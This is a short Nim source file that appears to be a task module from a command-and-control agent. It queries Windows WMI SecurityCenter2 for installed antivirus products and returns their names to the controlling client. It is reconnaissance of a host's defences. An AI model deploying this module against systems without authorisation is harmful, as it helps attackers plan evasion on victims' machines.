import std/[json, jsonutils]

import winim/com
import ../client/[communication, types]

proc executeTask*(app: App, taskId: int, params: seq[string]) =
  let taskOutput = newTaskOutput taskId
  var antiviruses: seq[tuple[name: string]] = @[]
  
  var wmi = GetObject "winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\SecurityCenter2"

  for av in wmi.execQuery "select * from AntivirusProduct":
    antiviruses.add (name: $av.displayName)
  
  taskOutput.addData Object, "response", $(toJson antiviruses)
  app.sendOutput taskOutput